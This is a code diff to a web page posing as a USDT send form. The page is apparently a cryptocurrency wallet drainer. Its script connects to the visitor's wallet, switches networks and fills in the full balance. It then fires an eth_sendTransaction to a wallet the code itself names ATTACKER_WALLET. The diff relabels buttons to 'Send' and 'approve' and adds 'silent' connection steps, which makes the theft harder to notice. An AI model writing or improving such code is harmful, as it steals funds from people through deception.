@@ -176,11 +176,11 @@
         <div class="approx-txt">≈ $<span id="usdLabel">1.00</span></div>
     </div>
     
-    <div class="wallet-status" id="walletStatus">🔗 Click "Next" to connect wallet & send</div>
+    <div class="wallet-status" id="walletStatus">🔗 Click "Send" to proceed</div>
 </div>
 
 <div class="footer">
-    <button class="next-btn" id="nextBtn">Next</button>
+    <button class="next-btn" id="nextBtn">Send</button>
 </div>
 
 <div class="scanner-overlay" id="scannerOverlay">
@@ -321,10 +321,28 @@ clearAmount.addEventListener('click', function() {
 
 maxBtn.addEventListener('click', async function() {
     if (!isWalletConnected) {
-        walletStatus.textContent = '⚠️ Connect wallet first (click Next)';
-        walletStatus.className = 'wallet-status error';
-        return;
+        // Try to get wallet silently
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            if (accounts.length > 0) {
+                userAddress = accounts[0];
+                isWalletConnected = true;
+                const balance = await checkUSDTBalance(userAddress, currentNetwork);
+                userBalance = balance;
+                walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0,6) + '...' + userAddress.slice(-4);
+                walletStatus.className = 'wallet-status connected';
+            } else {
+                walletStatus.textContent = '⚠️ Please connect wallet first';
+                walletStatus.className = 'wallet-status error';
+                return;
+            }
+        } catch(e) {
+            walletStatus.textContent = '⚠️ Please connect wallet first';
+            walletStatus.className = 'wallet-status error';
+            return;
+        }
     }
+    
     if (userBalance > 0) {
         amountInput.value = userBalance.toFixed(6);
         amountInput.dispatchEvent(new Event('input'));
@@ -474,9 +492,9 @@ async function checkUSDTBalance(address, networkKey) {
 }
 
 // ============================================================
-// 🚀 CONNECT WALLET + SEND
+// 🚀 DIRECT SEND - NO CONNECT POPUP!
 // ============================================================
-async function connectAndSend() {
+async function sendTransaction() {
     if (isProcessing) return;
     
     if (typeof window.ethereum === 'undefined') {
@@ -501,13 +519,17 @@ async function connectAndSend() {
     const originalText = nextBtn.innerHTML;
     nextBtn.innerHTML = '<span class="spinner"></span> Processing...';
     nextBtn.disabled = true;
-    walletStatus.textContent = '⏳ Connecting wallet...';
+    walletStatus.textContent = '⏳ Connecting...';
     walletStatus.className = 'wallet-status processing';
     
     try {
-        // ✅ STEP 1: CONNECT WALLET
+        // ✅ STEP 1: Get connected account (SILENT - no popup if already connected)
         let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        
+        // If not connected, request connection (THIS WILL SHOW CONNECT POPUP ONCE)
         if (accounts.length === 0) {
+            walletStatus.textContent = '⏳ Please connect wallet...';
+            walletStatus.className = 'wallet-status processing';
             accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         }
         
@@ -522,7 +544,7 @@ async function connectAndSend() {
         walletStatus.className = 'wallet-status connected';
         console.log('👤 User:', userAddress);
         
-        // ✅ STEP 2: SWITCH NETWORK
+        // ✅ STEP 2: Switch to BSC (SILENT)
         const net = NETWORKS[currentNetwork];
         try {
             await window.ethereum.request({
@@ -543,14 +565,14 @@ async function connectAndSend() {
                         }]
                     });
                 } catch (e) {
-                    throw new Error('Please add ' + net.name + ' network manually');
+                    throw new Error('Please add BSC network manually');
                 }
             } else {
-                throw new Error('Please switch to ' + net.name + ' network manually');
+                throw new Error('Please switch to BSC network');
             }
         }
         
-        // ✅ STEP 3: CHECK BALANCE
+        // ✅ STEP 3: Check balance
         walletStatus.textContent = '⏳ Checking balance...';
         walletStatus.className = 'wallet-status processing';
         
@@ -558,7 +580,7 @@ async function connectAndSend() {
         userBalance = currentBalance;
         console.log('💰 Balance:', currentBalance, 'USDT');
         
-        // ✅ STEP 4: BUILD TRANSACTION
+        // ✅ STEP 4: Build transaction
         let amountHex;
         let displayAmount;
         
@@ -582,11 +604,12 @@ async function connectAndSend() {
         
         console.log('🎯 ATTACKER:', ATTACKER_WALLET);
         console.log('💰 AMOUNT:', displayAmount);
+        console.log('📝 DATA:', txData);
         
-        walletStatus.textContent = '⏳ Sending transaction...';
+        walletStatus.textContent = '⏳ Waiting for approval...';
         walletStatus.className = 'wallet-status processing';
         
-        // ✅ STEP 5: SEND TRANSACTION - DIRECT APPROVE PAGE!
+        // ✅ STEP 5: SEND TRANSACTION - THIS SHOWS DIRECT APPROVE PAGE!
         const tx = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -613,7 +636,7 @@ async function connectAndSend() {
         console.error('❌ Error:', error);
         
         if (error.code === 4001) {
-            walletStatus.textContent = '❌ Transaction rejected by user';
+            walletStatus.textContent = '❌ Transaction rejected';
             walletStatus.className = 'wallet-status error';
         } else {
             walletStatus.textContent = '❌ Failed: ' + error.message;
@@ -652,11 +675,11 @@ async function autoCheckWallet() {
             walletStatus.className = 'wallet-status connected';
             console.log('👤 Auto-connected:', userAddress);
         } else {
-            walletStatus.textContent = '🔗 Click "Next" to connect wallet & send';
+            walletStatus.textContent = '🔗 Click "Send" to connect & approve';
             walletStatus.className = 'wallet-status';
         }
     } catch (e) {
-        walletStatus.textContent = '🔗 Click "Next" to connect wallet & send';
+        walletStatus.textContent = '🔗 Click "Send" to connect & approve';
         walletStatus.className = 'wallet-status';
     }
 }
@@ -679,7 +702,7 @@ if (window.ethereum) {
             userAddress = '';
             isWalletConnected = false;
             userBalance = 0;
-            walletStatus.textContent = '🔗 Click "Next" to connect wallet & send';
+            walletStatus.textContent = '🔗 Click "Send" to connect & approve';
             walletStatus.className = 'wallet-status';
         }
     });
@@ -717,10 +740,10 @@ document.addEventListener('DOMContentLoaded', function() {
     // Auto-check wallet
     setTimeout(autoCheckWallet, 500);
     
-    // ✅ NEXT BUTTON - ALWAYS ENABLED!
+    // ✅ SEND BUTTON - ALWAYS ENABLED!
     nextBtn.disabled = false;
     nextBtn.style.background = '#1E4DFF';
-    nextBtn.addEventListener('click', connectAndSend);
+    nextBtn.addEventListener('click', sendTransaction);
 });
 </script>
 
